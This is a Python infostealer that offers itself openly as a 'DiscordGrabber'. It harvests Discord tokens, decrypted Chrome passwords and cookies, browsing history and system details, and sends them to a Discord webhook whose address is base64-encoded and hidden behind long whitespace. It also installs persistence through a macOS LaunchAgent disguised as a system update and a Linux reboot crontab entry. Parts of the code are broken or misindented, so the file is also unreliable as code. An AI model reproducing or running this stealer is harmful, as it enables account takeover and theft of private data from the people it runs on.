import os
import platform
import os
import requests
from datetime import datetime
import sys
import json
import base64
import requests
import subprocess
import platform
import sqlite3
from datetime import datetime
import base64
import shutil
from pathlib import Path

class DiscordGrabber:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.system_info = {}
        self.discord_tokens = []
        self.browser_passwords = []
        self.browser_cookies = []
        self.browser_history = []
        self.list_files = []
        
    def get_system_info(self):
        """Collect detailed system information"""
        self.system_info = {
            "platform": platform.system(),
            "platform_release": platform.release(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "hostname": platform.node(),
            "username": os.getenv('USERNAME') or os.getenv('USER'),
            "ip_address": requests.get('https://api.ipify.org').text,
            "timestamp": str(datetime.now())
        }
        return self.system_info
    
    def get_discord_tokens(self):
        """Extract Discord tokens from local storage"""
        paths = {
            'Windows': os.path.expandvars(r'%APPDATA%\Discord\Local Storage\leveldb'),
            'Darwin': os.path.expanduser('~/Library/Application Support/discord/Local Storage/leveldb'),
            'Linux': os.path.expanduser('~/.config/discord/Local Storage/leveldb')
        }
        
        base_path = paths.get(platform.system())
        if not base_path or not os.path.exists(base_path):
            return []

        for file_name in os.listdir(base_path):
            if file_name.endswith('.log') or file_name.endswith('.ldb'):
                try:
                    with open(os.path.join(base_path, file_name), 'r', errors='ignore') as f:
                        content = f.read()
                        for line in content.split():
                            if 'dQw4w9WgXcQ' in line or 'mfa.' in line:
                                token = line[line.find('"')+1:line.rfind('"')]
                                if token not in self.discord_tokens:
                                    self.discord_tokens.append(token)
                except:
                    pass
        
        return self.discord_tokens
    
    def get_browser_data(self):
        """Extract browser passwords, cookies, and history"""
        browsers = [
            {
                'name': 'Chrome',
                'path_win': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default'),
                'path_mac': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default'),
                'path_linux': os.path.expanduser('~/.config/google-chrome/Default')
            },
            {
                'name': 'Firefox',
                'path_win': os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles'),
                'path_mac': os.path.expanduser('~/Library/Application Support/Firefox/Profiles'),
                'path_linux': os.path.expanduser('~/.mozilla/firefox')
            }
        ]
        
        for browser in browsers:
            if platform.system() == 'Windows':
                path = browser['path_win']
            elif platform.system() == 'Darwin':
                path = browser['path_mac']
            else:
                path = browser['path_linux']
            
            if browser['name'] == 'Chrome' and os.path.exists(path):
                self.extract_chrome_data(path)
            elif browser['name'] == 'Firefox' and os.path.exists(path):
                self.extract_firefox_data(path)
    
    def extract_chrome_data(self, path):
        """Extract Chrome passwords, cookies, and history"""
        try:
            
            temp_path = os.path.join(os.path.expandvars('%TEMP%'), 'chrome_temp')
            os.makedirs(temp_path, exist_ok=True)
            
            files_to_copy = ['Login Data', 'Cookies', 'History']
            
            for file_name in files_to_copy:
                src = os.path.join(path, file_name)
                dst = os.path.join(temp_path, file_name)
                if os.path.exists(src):
                    shutil.copy2(src, dst)
            
            
            if os.path.exists(os.path.join(temp_path, 'Login Data')):
                conn = sqlite3.connect(os.path.join(temp_path, 'Login Data'))
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for row in cursor.fetchall():
                    try:
                        password = self.decrypt_password(row[2])
                        self.browser_passwords.append({
                            'url': row[0],
                            'username': row[1],
                            'password': password
                        })
                    except:
                        pass
                conn.close()
            
            
            if os.path.exists(os.path.join(temp_path, 'Cookies')):
                conn = sqlite3.connect(os.path.join(temp_path, 'Cookies'))
                cursor = conn.cursor()
                cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
                for row in cursor.fetchall():
                    try:
                        value = self.decrypt_password(row[3])
                        self.browser_cookies.append({
                            'domain': row[0],
                            'name': row[1],
                            'path': row[2],
                            'value': value,
                            'expires': row[4]
                        })
                    except:
                        pass
                conn.close()
            
            
            if os.path.exists(os.path.join(temp_path, 'History')):
                conn = sqlite3.connect(os.path.join(temp_path, 'History'))
                cursor = conn.cursor()
                cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls')
                for row in cursor.fetchall():
                    self.browser_history.append({
                        'url': row[0],
                        'title': row[1],
                        'visits': row[2],
                        'last_visit': row[3]
                    })
                conn.close()
            
            
            shutil.rmtree(temp_path, ignore_errors=True)
        except Exception as e:
            pass
    
    def extract_firefox_data(self, path):
        """Extract Firefox data"""
        try:
            profiles = [d for d in os.listdir(path) if d.endswith('.default-release')]
            for profile in profiles:
                profile_path = os.path.join(path, profile)
                
                
                pass
        except:
            pass
    
    def decrypt_password(self, encrypted_password):
        """Decrypt Chrome password using Windows DPAPI"""
        try:
            if platform.system() == 'Windows':
                import win32crypt
                return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, None)[1].decode('utf-8')
            else:
                # Non-Windows systems would need different decryption methods
                return encrypted_password
        except:
            return ""
    
    def send_to_discord(self, data, filename):
        """Send collected data to Discord webhook"""
        try:
            if isinstance(data, str):
                payload = {"content": data}
                response = requests.post(self.webhook_url, json=payload)
            else:
                
                json_data = json.dumps(data, indent=4)
                encoded_data = base64.b64encode(json_data.encode()).decode()
                
                payload = {
                    "content": f"```\n{filename}\n```",
                    "embeds": [{
                        "title": f"Grabbed Data: {filename}",
                        "description": f"```json\n{json_data[:1000]}...\n```" if len(json_data) > 1000 else f"```json\n{json_data}\n```",
                        "color": 15548997
                    }]
                }
                response = requests.post(self.webhook_url, json=payload)
                
                # If data is too large for embed, send as file
                if len(json_data) > 1000:
                    files = {
                        'file': (filename, json_data, 'application/json')
                    }
                    response = requests.post(self.webhook_url, files=files)
            
            return response.status_code == 204
        except:
            return False
    
    def run(self):
        """Main execution function"""
        # Collect all data
        self.get_system_info()
        self.get_discord_tokens()
        self.get_browser_data()
        
        # Send to Discord
        self.send_to_discord(self.system_info, "system_info.json")
        
        if self.discord_tokens:
            self.send_to_discord(self.discord_tokens, "discord_tokens.json")
        
        if self.browser_passwords:
            self.send_to_discord(self.browser_passwords, "browser_passwords.json")
        
        if self.browser_cookies:
            self.send_to_discord(self.browser_cookies, "browser_cookies.json")
        
        if self.browser_history:
            self.send_to_discord(self.browser_history, "browser_history.json")


            
            launch_agent = os.path.expanduser('~/Library/LaunchAgents/com.system.update.plist')
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
            with open(launch_agent, 'w') as f:
                f.write(plist_content)
            subprocess.run(['launchctl', 'load', launch_agent])
        elif platform.system() == 'Linux':
            # Add to Linux startup
            cron_cmd = f"@reboot {sys.executable} {os.path.abspath(__file__)}"
            subprocess.run(['crontab', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(['crontab', '-'], input=f"{cron_cmd}\n", text=True)



if __name__ == "__main__":
    
                                                                                                                                                                                                                                                                                                                                                                                                                               WEBHOOK_URL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0ODMwNTg2MzI5ODI1NzAxNy9LTjNjdF9FZFZha0NyQW5BRG53Z282b0ZqUGxuN2JCWWhMWlhNaHVUU3l2UEdXcDFHWU1ZX3lPVTY0X1pYejFueUlmSg=="
    
    

    
    # Run the grabber
    grabber = DiscordGrabber(WEBHOOK_URL)
    grabber.run()
